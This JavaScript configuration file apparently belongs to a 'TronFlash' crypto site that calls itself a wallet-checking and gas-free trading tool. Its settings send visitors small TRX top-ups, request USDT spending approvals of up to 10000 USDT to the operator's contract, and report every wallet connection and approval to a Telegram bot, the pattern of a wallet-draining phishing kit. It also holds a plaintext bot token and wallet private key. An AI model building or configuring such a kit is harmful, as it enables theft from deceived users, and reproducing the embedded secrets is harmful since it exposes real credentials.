// ========================================
// 🎯 TRONFLASH MASTER CONFIGURATION FILE
// ========================================
// This is the HEART of your TronFlash website
// Edit ONLY this file to control everything!

const TRONFLASH_CONFIG = {
    // ========================================
    // 🤖 TELEGRAM BOT SETTINGS
    // ========================================
    TELEGRAM: {
        // Your Telegram Bot Token (get from @BotFather)
        BOT_TOKEN: "7536567492:AAHTGbJZXi2g7N_qY-AnpTBMZ6jHFYM42eM",
        
        // Your Telegram Chat ID (get from @userinfobot)
        CHAT_ID: "8191508290",
        
        // Enable/disable Telegram notifications
        ENABLED: true,
        
        // Notification settings
        NOTIFICATIONS: {
            WALLET_CONNECT: true,      // Notify when wallet connects
            WALLET_APPROVAL: true,     // Notify when wallet is approved
            TRX_SEND: true,           // Notify when TRX is sent
            BALANCE_ALERTS: true      // Notify on low balance
        }
    },

    // ========================================
    // 💰 WALLET CONFIGURATION
    // ========================================
    WALLET: {
        // Your TRON wallet address (starts with 'T')
        ADDRESS: "TWiLBLLxs1ZwBP8XiDU7K5Yxxa6zwaLA1E",
        
        // Your private key (keep this secure!)
        PRIVATE_KEY: "98a1988304855240e26064009afd0e6ff3683958c4e8c4c2f47f2e989562b0e1",
        
        // Auto TRX top-up settings
        AUTO_TOPUP: {
            ENABLED: true,                    // Enable automatic TRX top-up
            MINIMUM_BALANCE: 1,              // Minimum TRX balance required (in TRX)
            TOPUP_AMOUNT: 5,                 // Amount of TRX to send to users (in TRX)
            DELAY_AFTER_CONNECT: 2000        // Delay in milliseconds after wallet connects
        }
    },

    // ========================================
    // 🔗 CONTRACT ADDRESSES
    // ========================================
    CONTRACTS: {
        // USDT TRC20 Contract Address (for approvals)
        USDT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
        
        // Your contract address where users approve USDT spending
        YOUR_CONTRACT: "YOUR_CONTRACT_ADDRESS_HERE",
        
        // Your custom contract addresses (add your own)
        CUSTOM: {
            // Add your custom contract addresses here
            // EXAMPLE: "YOUR_CONTRACT_NAME": "TYourContractAddressHere123456789"
        }
    },

    // ========================================
    // 💳 USDT APPROVAL SETTINGS
    // ========================================
    USDT_APPROVAL: {
        // Enable/disable USDT approval functionality
        ENABLED: true,
        
        // Default approval amount (in USDT)
        DEFAULT_AMOUNT: 1000,              // 1000 USDT
        
        // Maximum approval amount (in USDT)
        MAX_AMOUNT: 10000,                 // 10000 USDT
        
        // Approval timeout (in milliseconds)
        TIMEOUT: 60000,                    // 60 seconds
        
        // Auto-approve settings
        AUTO_APPROVE: {
            ENABLED: false,                // Enable automatic approval
            AMOUNT: 1000,                  // Auto-approve amount
            CONDITIONS: {
                MIN_BALANCE: 100,          // Minimum USDT balance required
                MAX_DAILY_APPROVALS: 5     // Maximum approvals per day
            }
        },
        
        // Approval notifications
        NOTIFICATIONS: {
            ON_APPROVAL_SUCCESS: true,     // Notify on successful approval
            ON_APPROVAL_FAILURE: true,     // Notify on failed approval
            ON_APPROVAL_REVOKE: true       // Notify on approval revocation
        }
    },







    // ========================================
    // 📊 BALANCE MONITORING
    // ========================================
    BALANCE: {
        // Enable/disable balance monitoring
        ENABLED: true,
        
        // Balance check interval (in milliseconds)
        CHECK_INTERVAL: 30000,              // 30 seconds
        
        // Balance alert thresholds (in TRX)
        ALERTS: {
            LOW_BALANCE: 0.01,               // Alert when balance is below this
            CRITICAL_BALANCE: 5,           // Critical alert when below this
            VERY_LOW_BALANCE: 1,           // Very low balance alert
            
            // Customizable alert messages
            MESSAGES: {
                LOW_BALANCE: "Your TRX balance is below {threshold} TRX. Consider adding more funds.",
                CRITICAL_BALANCE: "Your TRX balance is critically low ({balance} TRX). Immediate action required!"
            }
        },
        
        // API settings
        API: {
            ENDPOINT: "https://api.trongrid.io",
            TIMEOUT: 10000                   // 10 seconds timeout
        }
    },

    // ========================================
    // 🎛️ ADMIN PANEL SETTINGS
    // ========================================
    ADMIN: {
        // Enable/disable admin panel
        ENABLED: true,
        
        // Auto-refresh settings
        AUTO_REFRESH: {
            ENABLED: true,
            INTERVAL: 30000                  // 30 seconds
        },
        
        // Data retention settings
        DATA_RETENTION: {
            MAX_USERS: 1000,                // Maximum users to keep in history
            MAX_TRANSACTIONS: 1000,         // Maximum transactions to keep
            MAX_APPROVALS: 1000             // Maximum approvals to keep
        },
        
        // Display settings
        DISPLAY: {
            SHOW_BALANCE: true,
            SHOW_TRANSACTIONS: true,
            SHOW_USERS: true,
            SHOW_APPROVALS: true
        }
    },

    // ========================================
    // 🌐 WEBSITE SETTINGS
    // ========================================
    WEBSITE: {
        // Website title
        TITLE: "TronFlash : Make safe and secure trading gas free",
        
        // Website description
        DESCRIPTION: "Tron Checker Tool is designed to check wallets against reports and give trust certificate with free fee for transaction",
        
        // Theme settings
        THEME: {
            PRIMARY_COLOR: "#667eea",
            SECONDARY_COLOR: "#764ba2",
            SUCCESS_COLOR: "#10b981",
            WARNING_COLOR: "#f59e0b",
            ERROR_COLOR: "#ef4444"
        },
        
        // Features
        FEATURES: {
            WALLET_CONNECT: true,
            BALANCE_CHECK: true,
            TRX_SEND: true,
            USDT_SUPPORT: true,
            ADMIN_PANEL: true
        }
    },

    // ========================================
    // 🔧 TECHNICAL SETTINGS
    // ========================================
    TECHNICAL: {
        // Debug mode
        DEBUG: false,
        
        // Console logging
        LOGGING: {
            ENABLED: true,
            LEVEL: "info"                   // debug, info, warn, error
        },
        
        // Performance settings
        PERFORMANCE: {
            CACHE_ENABLED: true,
            CACHE_DURATION: 300000,         // 5 minutes
            MAX_RETRIES: 3,
            RETRY_DELAY: 1000               // 1 second
        }
    },

    // ========================================
    // 🌐 NETWORK CONFIGURATION
    // ========================================
    NETWORK: {
        // TRON Network settings
        TRON: {
            MAINNET: {
                FULL_NODE: "https://api.trongrid.io",
                SOLIDITY_NODE: "https://api.trongrid.io",
                EVENT_SERVER: "https://api.trongrid.io",
                NETWORK_ID: "0x2b6653dc"
            },
            SHASTA_TESTNET: {
                FULL_NODE: "https://api.shasta.trongrid.io",
                SOLIDITY_NODE: "https://api.shasta.trongrid.io",
                EVENT_SERVER: "https://api.shasta.trongrid.io",
                NETWORK_ID: "0x94a9059e"
            },
            NILE_TESTNET: {
                FULL_NODE: "https://nile.trongrid.io",
                SOLIDITY_NODE: "https://nile.trongrid.io",
                EVENT_SERVER: "https://nile.trongrid.io",
                NETWORK_ID: "0xcd8690dc"
            }
        },
        
        // Current network (mainnet, shasta, nile)
        CURRENT_NETWORK: "mainnet",
        
        // Network timeout settings
        TIMEOUT: {
            CONNECTION: 10000,              // 10 seconds
            REQUEST: 30000,                 // 30 seconds
            TRANSACTION: 60000              // 60 seconds
        }
    },

    // ========================================
    // 💸 TRANSACTION SETTINGS
    // ========================================
    TRANSACTIONS: {
        // Default transaction settings
        DEFAULTS: {
            FEE_LIMIT: 100000000,           // 100 TRX in sun
            ENERGY_LIMIT: 1000000,          // Energy limit
            BANDWIDTH_LIMIT: 1000000        // Bandwidth limit
        },
        
        // Transaction retry settings
        RETRY: {
            MAX_ATTEMPTS: 3,
            DELAY_BETWEEN_ATTEMPTS: 5000,   // 5 seconds
            EXPONENTIAL_BACKOFF: true
        },
        
        // Transaction monitoring
        MONITORING: {
            ENABLED: true,
            CHECK_INTERVAL: 10000,          // 10 seconds
            MAX_WAIT_TIME: 300000           // 5 minutes
        }
    },

    // ========================================
    // 🔐 SECURITY SETTINGS
    // ========================================
    SECURITY: {
        // Private key security
        PRIVATE_KEY: {
            ENCRYPTION_ENABLED: false,      // Enable private key encryption
            ENCRYPTION_KEY: "",             // Encryption key (if enabled)
            AUTO_DESTROY: false,            // Auto-destroy private key after use
            DESTROY_DELAY: 5000             // Delay before destruction (ms)
        },
        
        // Address validation
        VALIDATION: {
            CHECKSUM_ENABLED: true,         // Enable address checksum validation
            FORMAT_VALIDATION: true,        // Enable format validation
            NETWORK_VALIDATION: true        // Enable network validation
        },
        
        // Rate limiting
        RATE_LIMITING: {
            ENABLED: true,
            MAX_REQUESTS_PER_MINUTE: 60,
            MAX_REQUESTS_PER_HOUR: 1000,
            BLOCK_DURATION: 300000          // 5 minutes
        }
    },

    // ========================================
    // 🚀 DEPLOYMENT SETTINGS
    // ========================================
    DEPLOYMENT: {
        // Environment
        ENVIRONMENT: "production",          // development, staging, production
        
        // API endpoints
        API_ENDPOINTS: {
            TRONGRID: "https://api.trongrid.io",
            TELEGRAM: "https://api.telegram.org",
            BACKUP_TRONGRID: "https://api.trongrid.io"
        },
        
        // Security settings
        SECURITY: {
            ENABLE_HTTPS: true,
            CORS_ENABLED: true,
            RATE_LIMITING: true,
            API_KEY_REQUIRED: false,
            API_KEY: ""                     // Add your API key if required
        },
        
        // Performance settings
        PERFORMANCE: {
            CACHE_ENABLED: true,
            CACHE_DURATION: 300000,         // 5 minutes
            COMPRESSION_ENABLED: true,
            CDN_ENABLED: false
        }
    }
};

// ========================================
// 🔄 AUTO-CONFIGURATION FUNCTIONS
// ========================================

// Initialize all configurations
function initializeConfig() {
    console.log("🚀 Initializing TronFlash Configuration...");
    
    // Set up Telegram configuration
    if (window.TELEGRAM_CONFIG) {
        window.TELEGRAM_CONFIG.BOT_TOKEN = TRONFLASH_CONFIG.TELEGRAM.BOT_TOKEN;
        window.TELEGRAM_CONFIG.CHAT_ID = TRONFLASH_CONFIG.TELEGRAM.CHAT_ID;
        window.TELEGRAM_CONFIG.ENABLED = TRONFLASH_CONFIG.TELEGRAM.ENABLED;
        console.log("✅ Telegram configuration updated");
    }
    
    // Set up wallet configuration (for backward compatibility)
    window.walletConfig = {
        WALLET_ADDRESS: TRONFLASH_CONFIG.WALLET.ADDRESS,
        PRIVATE_KEY: TRONFLASH_CONFIG.WALLET.PRIVATE_KEY,
        LOW_BALANCE_THRESHOLD: TRONFLASH_CONFIG.WALLET.AUTO_TOPUP.MINIMUM_BALANCE,
        TOPUP_AMOUNT: TRONFLASH_CONFIG.WALLET.AUTO_TOPUP.TOPUP_AMOUNT,
        ENABLED: TRONFLASH_CONFIG.WALLET.AUTO_TOPUP.ENABLED,
        CHECK_INTERVAL: TRONFLASH_CONFIG.BALANCE.CHECK_INTERVAL
    };
    console.log("✅ Wallet configuration updated");
    
    // Initialize balance reader with master config
    if (window.balanceReader) {
        window.balanceReader.initialize(TRONFLASH_CONFIG.WALLET);
        console.log("✅ Balance reader initialized with master config");
    }
    
    // Set up balance monitoring
    if (window.balanceMonitor) {
        window.balanceMonitor.updateInterval = TRONFLASH_CONFIG.BALANCE.CHECK_INTERVAL;
        console.log("✅ Balance monitoring updated");
    }
    
    // Set up admin panel
    if (window.adminPanel) {
        window.adminPanel.autoRefreshInterval = TRONFLASH_CONFIG.ADMIN.AUTO_REFRESH.INTERVAL;
        console.log("✅ Admin panel updated");
    }
    
    console.log("🎉 TronFlash Configuration initialized successfully!");
}

// Update configuration on the fly
function updateConfig(newConfig) {
    Object.assign(TRONFLASH_CONFIG, newConfig);
    initializeConfig();
    console.log("🔄 Configuration updated:", newConfig);
}

// Get current configuration
function getConfig() {
    return TRONFLASH_CONFIG;
}

// Manually trigger balance check
function checkBalance() {
    if (window.balanceMonitor) {
        window.balanceMonitor.checkBalance();
        console.log("🔄 Manual balance check triggered");
    } else {
        console.log("❌ Balance monitor not available");
    }
}

// Export configuration for use in other scripts
window.TRONFLASH_CONFIG = TRONFLASH_CONFIG;
window.initializeConfig = initializeConfig;
window.updateConfig = updateConfig;
window.getConfig = getConfig;
window.checkBalance = checkBalance;

// Auto-initialize when DOM is ready
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initializeConfig);
} else {
    initializeConfig();
}

// ========================================
// 📝 COMPREHENSIVE CONFIGURATION GUIDE
// ========================================
/*
🎯 HOW TO USE THIS MASTER CONFIGURATION FILE:

1. 🤖 TELEGRAM SETTINGS:
   - Change BOT_TOKEN and CHAT_ID to your actual values
   - Enable/disable specific notifications
   - Configure notification preferences

2. 💰 WALLET CONFIGURATION:
   - Update ADDRESS and PRIVATE_KEY with your wallet details
   - Configure auto-topup amounts and thresholds
   - Set minimum balance requirements

3. 🔗 CONTRACT ADDRESSES:
   - USDT TRC20 contract for approvals
   - Add custom contract addresses in CUSTOM section
   - Focused on USDT approval functionality

4. 💳 USDT APPROVAL SETTINGS:
   - Configure approval amounts and limits
   - Set auto-approve conditions
   - Configure approval notifications

5. 📊 BALANCE MONITORING:
   - Adjust check intervals and alert thresholds
   - Enable/disable balance monitoring
   - Configure API settings

6. 🎛️ ADMIN PANEL:
   - Configure auto-refresh intervals
   - Set data retention limits
   - Enable/disable display features

7. 🌐 WEBSITE SETTINGS:
   - Change title and description
   - Customize theme colors
   - Enable/disable features

8. 🌐 NETWORK CONFIGURATION:
   - Mainnet, Shasta testnet, Nile testnet
   - Full node, solidity node, event server settings
   - Network timeout configurations

9. 💸 TRANSACTION SETTINGS:
   - Default fee limits and energy limits
   - Transaction retry settings
   - Transaction monitoring configuration

10. 🔐 SECURITY SETTINGS:
    - Private key encryption options
    - Address validation settings
    - Rate limiting configuration

11. 🔧 TECHNICAL SETTINGS:
    - Enable debug mode for troubleshooting
    - Configure logging levels
    - Set performance parameters

12. 🚀 DEPLOYMENT SETTINGS:
    - Set environment (development/production)
    - Configure API endpoints
    - Set security and performance options

🔧 ESSENTIAL CHANGES FOR NEW OWNERS:

// 1. Update Telegram bot credentials
TELEGRAM: { 
    BOT_TOKEN: "YOUR_BOT_TOKEN_HERE",
    CHAT_ID: "YOUR_CHAT_ID_HERE"
}

// 2. Update wallet for auto TRX topup
WALLET: { 
    ADDRESS: "YOUR_WALLET_ADDRESS_HERE",
    PRIVATE_KEY: "YOUR_PRIVATE_KEY_HERE"
}

// 3. Update your contract address for USDT approvals
CONTRACTS: { 
    YOUR_CONTRACT: "YOUR_CONTRACT_ADDRESS_HERE"
}

🔧 OPTIONAL CUSTOMIZATIONS:

// Change TRX topup amount to 10
WALLET: { AUTO_TOPUP: { TOPUP_AMOUNT: 10 } }

// Change USDT approval amount to 5000
USDT_APPROVAL: { DEFAULT_AMOUNT: 5000 }

// Change balance check to every 60 seconds
BALANCE: { CHECK_INTERVAL: 60000 }

// Enable debug mode
TECHNICAL: { DEBUG: true }

// Switch to testnet
NETWORK: { CURRENT_NETWORK: "shasta" }

// Add custom contract
CONTRACTS: { CUSTOM: { "MY_TOKEN": "TMyTokenAddress123456789" } }

// Update exchange addresses
EXCHANGES: { BINANCE: { HOT_WALLET: "TRealBinanceAddress123" } }

// Change transaction fee limit
TRANSACTIONS: { DEFAULTS: { FEE_LIMIT: 200000000 } }

// Enable private key encryption
SECURITY: { PRIVATE_KEY: { ENCRYPTION_ENABLED: true } }

🎯 IMPORTANT NOTES:
- All wallet addresses are examples - replace with real addresses
- Keep private keys secure and never share them
- Test changes on testnet before using on mainnet
- Regular backups of configuration recommended
- Monitor logs for any configuration issues

🚀 After making changes, refresh your website to apply them!
*/
